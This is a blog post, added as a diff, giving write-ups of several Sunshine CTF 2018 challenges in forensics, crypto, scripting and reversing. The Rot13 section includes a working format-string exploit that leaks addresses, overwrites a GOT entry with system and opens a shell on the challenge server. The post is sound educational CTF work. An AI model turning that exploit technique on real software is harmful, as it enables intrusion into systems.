@@ -1,0 +1,658 @@
+---
+layout: post
+title: Sunshine CTF 2018
+date: '2018-04-08 11:00:00'
+---
+
+I had great fun over the weeked playing in [Sunshine CTF](https://sunshinectf.org/), managing to solve 15 of the challenges for my team OpenToAll which I think is a PB :) Here is a writeup for most of the challenges
+
+## Forensics
+
+### Data Exfil
+
+> We think a critical document has been stolen out of our network, luckily our next gen IDS managed to capture the traffic during the attack. Can you tell us what they took
+> 
+> Author: Medic-
+
+*100 points, 181 Solves, forensics*
+
+We are given a bunch of traffc capture files including a pcap. Looking through `strings pcap.pcap` there is a a susicious looking group of strings including `cozybear`:
+
+```python
+Accept: */*
+<504b030414000000000030be774c973a10791e0000001e0000000a000000
+cozybear
+group
+uPZUR
+<504b030414000000000030be774c973a10791e0000001e0000000a000000
+cozybear
+group
+<7365637265742e74787473756e7b7730775f495f646e735f7333335f7930
+cozybear
+group
+<7365637265742e74787473756e7b7730775f495f646e735f7333335f7930
+cozybear
+group
+<755f316e5f683372337d504b0102140014000000000030be774c973a1079
+cozybear
+group
+ebay
+<755f316e5f683372337d504b0102140014000000000030be774c973a1079
+cozybear
+group
+<1e0000001e0000000a000000000000000100200000000000000073656372
+cozybear
+group
+q_1.
+ebay
+ebay
+<1e0000001e0000000a000000000000000100200000000000000073656372
+cozybear
+group
+865742e747874504b0506000000000100010038000000460000000000
+cozybear
+group
+ebay
+dynect
+hostmaster
+ebay
+865742e747874504b0506000000000100010038000000460000000000
+cozybear
+```
+
+The hex strings look in the ascii range, and converting them reviels the flag:
+```bash
+$ unhex 7365637265742e74787473756e7b7730775f495f646e735f7333335f7930755f316e5f683372337d504b0102140014000000000030be774c973a1079 | xxd
+00000000: 7365 6372 6574 2e74 7874 7375 6e7b 7730  secret.txtsun{w0
+00000010: 775f 495f 646e 735f 7333 335f 7930 755f  w_I_dns_s33_y0u_
+00000020: 316e 5f68 3372 337d 504b 0102 1400 1400  1n_h3r3}PK......
+00000030: 0000 0000 30be 774c 973a 1079            ....0.wL.:.y
+```
+
+`sun{w0w_I_dns_s33_y0u_1n_h3r3}`
+
+
+### My Secret Stash
+
+> Do you like secrets? I like secrets! In fact, I LOVE SECRETS! But there's no way I'll ever share my secrets with you! Not in a million years! I don't share secrets with anyone! Okay, I might share one secret with you, but I've stashed it away somewhere you'll never think to find it!
+> 
+> If you can dig up my secert stash I'll let you have it! How about that huh? Does that sound like a fun game? See if you can dig up my secret stash!
+> 
+> hahahahahahahahahahahaha!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+> Author: hackucf_charlos
+
+*100 points, 154 Solves, forensics*
+
+We are given and empty folder with a git repo but with no interesting commit, luckily we can just lokk at all of the objects directly:
+
+```bash
+$ for f in .git/objects/*/*; do zlib-flate -uncompress < $f; done
+<SNIP>
+. I want to keep all of my secrets to myself for now on! Good luck trying to find them, there's nothing to find. hehehehehehehehe!!!!!!
+blob 17sun{git_gud_k1d}
+tree 35100644 secrets�sn|�\�IJq�f���ytree 35100644 secrets���/z�'�g!/�-�l#�tree 35100644 secrets��1��-��E4��V�a}�
+```
+
+`sun{git_gud_k1d}`
+
+
+### High Aptitude
+
+
+> It's the same old routine day in, day out: snap some photos, fax 'em down. That's how we've been doing it for years, and we never needed any of your modern yuppie "packet-switched networks" to make it happen, either. Nothin' but good 'ol American science.
+> 
+> Only wish I had something less obscure to look at instead of this blasted "flag" thing...
+> 
+> Note: Flag is in flag{...} format
+> 
+> Author: charlton
+> 
+> flag_148890.wav
+> 
+> Hint 2018-04-06 05:44 UTC: https://www.youtube.com/watch?v=S1geZ_27a4M
+
+*150 points, 36 Solves, forensics*
+
+The challenge mentions faxing and after listening to the recoding it does sound like a fax. I tried a few and ended up using [SeaTTY](http://www.dxsoft.com/en/products/seatty/) in HF-FAX mode, which produced the flag:
+
+![fax](/assets/images/fax.jpg)
+
+
+### Old Favorites
+
+
+> We were sent this file with the description '9/10 people could find the hidden flag, are you one of them?'.
+> 
+> Author: hackucf_loavso
+> 
+> OldFavorites.mp4
+
+*150 points, 44 Solves, forensics*
+
+Rick rolled >.<
+After watching the video there is a very strange section of audio. A bit of reading about audio steganography I came accross [a lifehacker article](https://www.lifehacker.com.au/2011/06/how-to-hide-secret-messages-and-codes-in-audio-files/). Downloading [Sonic Visualiser](https://www.sonicvisualiser.org/) and opening the audio section, then selecting Add Spectrogram  reveals:
+
+![specto](/assets/images/specto.jpg)
+
+
+### Old Favorites 2
+
+> It looks like they sent us the same file again? But maybe there's something new in this one.
+> 
+> Author: hackucf_loavso
+> 
+> OldFavorites2.mp4
+> 
+> Update 2018-04-06 19:22 UTC: Increased point value from 300 -> 450.
+
+*450 points, 6 Solves, forensics*
+
+It looks like the exact same file from part one, but doing a diff of the files reveals a small section that has changed. Only the least significat bit (LSB) has been modified for each byte in the modified section, which is a pretty common technique of encoding data into images without any visible changes.
+
+![diff](/assets/images/old_school_diff.png)
+
+It works by encoding binary data into the LSB, we can check what is it by just seeing if the byte is odd or even As I didnt know where it the payload started, I extracted a few extra bytes around the diff then ran the following to decode it:
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+def decode_binary_string(s):
+    return ''.join(chr(int(s[i*8:i*8+8],2)) for i in range(len(s)//8))
+
+data = read("diff.raw")
+for i in range(8):
+    binary = ""
+    for b in data[i:]:
+        if ord(b)%2==0:
+            binary += "0"
+        else:
+            binary += "1"
+
+    print decode_binary_string(binary)
+```
+
+### Phishy Phisy
+
+> Updating to the newest version of Windows was a pain, but it was totally worth it! It allowed me to unlock my inner Creator, and truly bring the Canvas to life! I'm pretty sure that in the next major release, they are going to go one step further on my favorite application -- THE 4TH DIMENSION.
+>
+> Hint 1: My brother sure loves pranking me... But I think he went to far this time. Last time he just defaced my project. This time, my project wont even open! Ugh.
+> 
+> Hint 2: Some weird %localappdata% directories are in my Quick Access history. Something about Microsoft.MSPaint_8wekyb3d8bbwe? IDK, this tech stuff is annoying. I should have bought a Mac.
+> 
+> Author: hackucf_sneaky
+
+*500 points, 5 Solves, forensics*
+
+The zip file contains a bunch bin files:
+```bash
+$ ls
+Canvas_0.bin  Canvas_4.bin  EngineConfigId.bin                                    Nodes_18446744069414584343_NodeBounds.bin        Nodes_18446744069414584343_SurfaceAlignmentProvider.bin  Resources_Surfaces_26.bin
+Canvas_1.bin  Canvas_5.bin  Nodes_18446744069414584343_AxisAlignmentProvider.bin  Nodes_18446744069414584343_NodeParent.bin        Resources_Heirarchies_2.bin                              Resources_Surfaces_27.bin
+Canvas_2.bin  Canvas_6.bin  Nodes_18446744069414584343_Canvas3d.bin               Nodes_18446744069414584343_NodePRS.bin           Resources_Mesh_18446744069414584343.bin                  SceneData.bin
+Canvas_3.bin  Canvas_7.bin  Nodes_18446744069414584343_MeshInstance.bin           Nodes_18446744069414584343_PhysicsComponent.bin  Resources_SurfaceNormals_2.bin                           Thumbnail.png
+```
+
+From the hint we know that the challenge has something do to with MSPaint, and after investigating it looks like it is a copy of an auto-saved Paint 3D project. Trying to get paint to open it but replacing an exiting project was causing an error, so something is corrupted.
+
+Comparing the files with a valid project there are a couple of fishy files where there should be `FF` bytes there are word:
+```bash
+$ xxd Resources_Mesh_18446744069414584343.bin | head -n 3
+00000000: 0100 0000 0300 0000 1700 0000 4649 5348  ............FISH
+00000010: cd03 0000 ea15 0000 01ba cbd8 bf8c b223  ...............#
+00000020: beb3 8022 3ff9 41c8 bef4 c947 be06 aa0f  ..."?.A....G....
+
+$ xxd Nodes_18446744069414584343_MeshInstance.bin | head -n 3
+00000000: 0100 0000 0300 0000 1700 0000 5354 494b  ............STIK
+```
+
+Replacing these with `ffffffff` allows paint to open the project and shows a fish, which when spun around shows the flag:
+
+![fish](/assets/images/paint_fish.jpg)
+
+
+## Pwn
+
+### Rot13
+> An inventor claims to have designed a machine that enciphers messages in a way that's impossible to break. He's holding a demo of this machine soon and is planning to allow people to try it out. See if you can find a way to ruin his demonstration!
+> 
+> nc chal1.sunshinectf.org 20006
+> 
+> Author: hackucf_kcolley
+
+*200 points, 67 Solves, pwn*
+
+A pretty simple binary that just reads some text and then prints the rot13 of it:
+
+```c
+char v1; // [esp+3h] [ebp-415h]
+size_t i; // [esp+4h] [ebp-414h]
+size_t v3; // [esp+8h] [ebp-410h]
+char s[1024]; // [esp+Ch] [ebp-40Ch]
+unsigned int v5; // [esp+40Ch] [ebp-Ch]
+
+v5 = __readgsdword(0x14u);
+puts("Welcome to Hackersoft Rot13 Encrypter Home and Student Edition 2018.");
+puts("  \"Because rot13 is the best encryption (tm)\" ~Eve");
+puts((const char *)&unk_BCB);
+puts("Note: Hackersoft Rot13 Encrypter Home and Student Edition can only");
+puts("encrypt data. In order to decrypt rot13-encrypted data, you must");
+puts("purchase Hackersoft Rot13 Decrypter Professional 2018.");
+do
+{
+  puts("\nEnter some text to be rot13 encrypted:");
+  if ( !fgets(s, 1024, stdin) )
+    break;
+  v3 = strlen(s);
+  for ( i = 0; i < v3; ++i )
+  {
+    v1 = s[i];
+    if ( (*__ctype_b_loc())[v1] & 0x200 )
+    {
+      v1 = (v1 - 84) % 26 + 97;
+    }
+    else if ( (*__ctype_b_loc())[v1] & 0x100 )
+    {
+      v1 = (v1 - 52) % 26 + 65;
+    }
+    s[i] = v1;
+  }
+  printf("Rot13 encrypted data: ");
+  printf(s);
+}
+while ( !feof(stdin) );
+puts("Thank you for using Hackersoft Rot13 Encrypter Home and Student Edition 2018!");
+```
+
+The issue is that it prints the encoded text directly with `printf(s);` so we have a pretty basic format string vulnerability with the addition of having to rot13 our payload first:
+
+```python
+#!/usr/bin/env python2
+from pwn import *
+import string
+
+rot13 = string.maketrans(
+    "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
+    "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
+def rot(s):
+  return string.translate(s, rot13)
+
+def get_data():
+    p.recvuntil(" data: ")
+    resp = p.recvuntil("\n\nEnter some text", drop=True)
+    return resp
+
+def send_payload(payload):
+    log.info("payload = %s" % repr(payload))
+    p.sendline(rot(payload))
+    return get_data()
+
+def exploit():
+  p.sendlineafter("encrypted:", rot("%2$p"))
+  leak1 = int(get_data()[2:],16)
+  libc.address = leak1 -  0x25325
+  log.info("libc: 0x{:x}".format(libc.address))
+
+  p.sendlineafter("encrypted:", rot("%3$p"))
+  leak = int(get_data()[2:],16)
+  binary.address = leak - 0x95b
+  log.info("binary: 0x{:x}".format(binary.address))
+
+  format_string = FmtStr(execute_fmt=send_payload)
+  format_string.write(binary.got["strlen"], libc.symbols["system"])
+  format_string.execute_writes()
+
+  p.sendline("/bin/sh")
+  p.interactive()
+
+if __name__ == "__main__":
+  name = "./rot13"
+  binary = ELF(name)
+
+  libc_name = "./rot13-libc.so"
+  libc = ELF(libc_name)
+
+  if len(sys.argv) > 1:
+    p = remote("chal1.sunshinectf.org", 20006)
+  else:
+    p = process(name, env={'LD_PRELOAD': libc_name})
+```
+
+Flag: `sun{q0hoy3_e0g13_1f_o3gg3e_gu4a_gu3_3a1tz4_z4pu1a3}`
+
+## Crypto
+
+### Bomba
+
+> We've intercepted this transmission and found this code sheet. See if you can decode the message!
+> 
+> UCF 07 ZERO 0800 = 50 = MHW FLC =
+> LWB VJT LWD QYB JMS AMU RBO QXY SBZ EYN RLG RNK KVQ YJK EKR GMS CYB MH=
+> 
+> Note: Wrap plaintext in sun{} before submitting!
+> 
+> Author: hackucf_zero
+
+*100 points, 21 Solves, crypto*
+
+We're given a codesheet which after a quick reverse image search reveals that it's for the enigma machine:
+![codesheet](/assets/images/codesheet.jpg)
+
+After an enjoying read about how enigma machines work, I found a python module `py-enigma` to help decode the message. The first part of the code is the date and time, so we know to use the number 7 settings in the codebook. This is confirmed by the first part of the message `LWB` matching one of the groups in the codebook for number 7.
+
+We get first set the display to `MHW` and decode `FLC` to find the initial starting value, then decode the message skipping the first group:
+
+```python
+#!/usr/bin/env python2
+from enigma.machine import EnigmaMachine
+
+"""
+UCF 07 ZERO 0800 = 50 = MHW FLC =
+LWB VJT LWD QYB JMS AMU RBO QXY SBZ EYN RLG RNK KVQ YJK EKR GMS CYB MH=
+
+"""
+machine = EnigmaMachine.from_key_sheet(
+       rotors='V I IV',
+       reflector='B',
+       ring_settings=[18, 11, 25],
+       plugboard_settings='TS IK AV QP HW FM DX NG CY UE')
+
+machine.set_display('MHW')
+msg_key = machine.process_text('FLC')
+machine.set_display(msg_key)
+
+ciphertext = 'LWBVJTLWDQYBJMSAMURBOQXYSBZEYNRLGRNKKVQYJKEKRGMSCYBMH='[3:]
+plaintext = machine.process_text(ciphertext)
+
+print(plaintext)
+
+# sun{DAMNXTHATXBOMBAXKRYPTOLOGICZNAXANDXMARIANXREJEWSKI}
+```
+
+
+### Visionary
+
+> We found these two cryptic messages scrawled onto a wall and managed to find the decrypted text for them.
+> 
+> Author: hackucf_zach
+> 
+> Update 2018-04-07 02:02 UTC: Increased point value from 100 -> 150!
+
+*150 points, 79 Solves, crypto*
+
+This was just a vigenere cipher, we can find the key by comparing the provided plain and cipher text, then use it to decode the flag:
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+plain  = read("visionary/Decipher(Cipher1).txt")
+cipher = read("visionary/Cipher1.txt")
+flag = read("visionary/cipherFlag.txt")
+
+table_raw = read("table.tsv")
+table = []
+for line in table_raw.split("\n"):
+  part = []
+  for i in range(0, len(line), 2):
+    part.append(line[i])
+  table.append(part)
+
+key = ""
+for i, c in enumerate(plain[0:100]):
+  col = table[0].index(c)
+  for row in range(len(table)):
+    if table[row][col] == cipher[i]:
+      key += table[row][0]
+      break
+
+print key
+
+dec_flag = ""
+for i, c in enumerate(flag[:-1]):
+  col = table[0].index(key[i])
+  for row in range(len(table)):
+    if table[row][col] == flag[i]:
+      dec_flag += table[row][0]
+      break
+
+print dec_flag
+```
+Running:
+```bash
+$ ./solv.py
+5T3@mPuNk_Wh@t_5T3@mP_l0lR3p34t5T3@mPuNk_Wh@t_5T3@mP_l0lR3p34t5T3@mPuNk_Wh@t_5T3@mP_l0lR3p34t5T3@mPu
+sun{Why_would_Any0n3_use_A_T@bl3_tH@t_LaRg3}
+```
+
+## Scripting
+
+### Missing Bytes
+> Some of our file systems have gotten corrupted and now file information is incorrect. Can you help us find those corrupt folders?
+> 
+> nc chal1.sunshinectf.org 30001
+> 
+> Author: hackucf_vrael
+> 
+> Update 2018-04-06 18:00 UTC: Decreased number of rounds from 30 -> 20 and doubled the allowed time limit.
+
+*200 points, 33 Solves, scripting*
+
+When connecting to the server you are given a prompt with 3 commands, `cd`, `ls`, and `send`. The problem is that the filesystem has been corrupted and you have to find the directories that are reporting the incorrect size, by comparing the reported value with the sum of all the files inside it. I started doing a depth first search but as the level of folders is very high it was never finishing, so switched to breath first search and let it run.
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+def get_list():
+  queue = [("/", -1)]
+
+  p.recvuntil(": $")
+  while len(queue) > 0:
+    (current, supplied_size) = queue.pop()
+    p.sendline("cd " + current)
+    p.sendlineafter(": $", "ls")
+    p.recvuntil("entries")
+    resp = p.recvuntil(": $")
+    files = {}
+    real_size = 0
+    for line in resp.split("\r\n"):
+      if "DIR" in line or "FILE" in line:
+        parts = filter(None, line.split(" "))
+        [name, kind, size] = parts
+        files[name] = { "kind": kind, "size": int(size)}
+        real_size += int(size)
+
+    for name in files:
+      file = files[name]
+      if file["kind"] == "DIR":
+        queue.append((current+name+"/", file["size"]))
+
+    if supplied_size != -1 and real_size != supplied_size:
+      print "*******"
+      print "dir: {}".format(current)
+      print "calc: {}".format(real_size)
+      print "said: {}".format(supplied_size)
+      p.sendline("send .")
+      p.recvuntil("Correct!")
+      tmp = p.recvuntil((": $", "Hooray"))
+      if "Hooray" in tmp:
+        queue = [("/", -1)]
+        print len(queue)
+        print "HoorayHoorayHoorayHooray"
+      else:
+        p.unrecv(tmp)
+
+
+def exploit():
+  p.sendlineafter("begin.", "start")
+
+  get_list()
+  p.interactive()
+
+
+if __name__ == "__main__":
+  p = remote("chal1.sunshinectf.org", 30001)
+
+  exploit()
+```
+
+
+### WorkshopHelper
+> Our workshop needs to figure out which gears to use in our mechs! Help us find those gears!
+> 
+> http://workshop.web1.sunshinectf.org
+> 
+> Note: All answers are integers!
+> 
+> Author: hackucf_vrael
+> 
+> Update 2018-04-06 18:00 UTC: Fixed time limit calculation.
+
+
+*300 points, 58 Solves, scripting*
+
+You are shown a page with  a large number of questions, with a header at the top telling you which one to solve. I decided this would be easy to to solve with some javascript and paste it straight into the browers:
+
+```javascript
+function gogo() {
+	let gear = get_gear();
+	let answer = get_answer(gear);
+	submit_answer(gear, answer);
+}
+
+function get_gear() {
+	let question = document.querySelector("#question").textContent;
+	let [full, key, value] = question.match(/a\(n\) (.*) of (.*)/)
+	let gear = document.querySelector(`[${key} = "${value}"]`);
+
+	return gear;
+}
+
+function get_answer(gear) {
+	let question = gear.querySelector("h3").textContent;
+	let answer = Math.trunc(eval(question));
+	console.log("question", question);
+	console.log("answer", answer);
+	return answer;
+}
+
+function submit_answer(gear, answer) {
+	gear.scrollIntoView();
+	let input = gear.querySelector(`input[type = "text"]`);
+	if (input) {
+		setNativeValue(input, answer);
+    input.dispatchEvent(new Event('input', { bubbles: true }));
+	} else {
+		let input = gear.querySelector(`input[text = "${answer}"]`)
+		input.click();
+
+	}
+	gear.querySelector(`button`).click();
+}
+
+function setNativeValue(element, value) {
+  const valueSetter = Object.getOwnPropertyDescriptor(element, 'value').set;
+  const prototype = Object.getPrototypeOf(element);
+  const prototypeValueSetter = Object.getOwnPropertyDescriptor(prototype, 'value').set;
+
+  if (valueSetter && valueSetter !== prototypeValueSetter) {
+  	prototypeValueSetter.call(element, value);
+  } else {
+    valueSetter.call(element, value);
+  }
+}
+
+setInterval(gogo, 1000)
+```
+
+## Re
+
+### Source Protection
+
+> People said I shouldn't use Python to write my password vault because they would be able to read my source code, but they underestimated how smart I am. In fact, I'm so confident in my source code protection that I'm going to upload my password vault and challeng a bunch of nerds to hack it. Good luck :)
+> 
+> Author: hackucf_dmaria
+> 
+> passwords.exe
+*100 points, 118 Solves, re*
+
+We are given an exe but told that it is written in python. A quick search reveals [python-exe-unpacker](https://github.com/countercept/python-exe-unpacker) which lets us extract the exe then a quick grep finds the password:
+```bash
+$ strings passwords.exe_extracted/* | grep 'sun{'
+sun{py1n574ll3r_15n7_50urc3_pr073c710n}t
+```
+
+### Order Matters
+
+> The vault to access this armory is protected with some weird password algorithm. Can you gain access?
+> 
+> Author: Winyl
+> 
+> Hint: The password should be a string of unique numbers (eq. 1 2 11 12 = 01021112)
+> 
+> Update 2018-04-06 19:15 UTC: Increased point value from 250 -> 350.
+> Update 2018-04-07 00:02 UTC: Added hint!
+
+*350 points, 32 Solves, re*
+
+The binary reads a password, and then depending on the numbers will perform one of 15 operations. I started trying to solve this with angr, but that wasn't working at. Taking another look at the disassembly I saw that all the steps were getting thier values like this:
+```c
+long p06()
+{
+  return strtol("51563969", 0, 16);
+}
+```
+The constansts were very suspicious, as the were all in the ascii range. Sure enough, converting them to text revealed that they were base64:
+```python
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import *
+
+bits = [
+  b64d(unhex("58335249")),
+  b64d(unhex("58306c45")),
+  b64d(unhex("5a314e66")),
+  b64d(unhex("63335675")),
+  b64d(unhex("58335177")),
+  b64d(unhex("51563969")),
+  b64d(unhex("4e484a45")),
+  b64d(unhex("66513d3d")),
+  b64d(unhex("4d313935")),
+  b64d(unhex("59544578")),
+  b64d(unhex("4d313943")),
+  b64d(unhex("4d486c7a")),
+  b64d(unhex("6532315a")),
+  b64d(unhex("5831526f")),
+  b64d(unhex("556a4675")),
+]
+
+for i, bit in enumerate(bits):
+  print "{} - {}".format(i+1, bit)
+```
+
+Running it:
+```bash
+$ ./solv.py
+1 - _tH
+2 - _ID
+3 - gS_
+4 - sun
+5 - _t0
+6 - A_b
+7 - 4rD
+8 - }
+9 - 3_y
+10 - a11
+11 - 3_B
+12 - 0ys
+13 - {mY
+14 - _Th
+15 - R1n
+```
+
+So now the name makes sense, we have to find the correct order of to produce the flag. After a bit of manual swapping we we end up wit h the password `041302061503101411120501090708` and the flag `sun{mY_IDA_bR1ngS_a11_Th3_B0ys_t0_tH3_y4rD}`
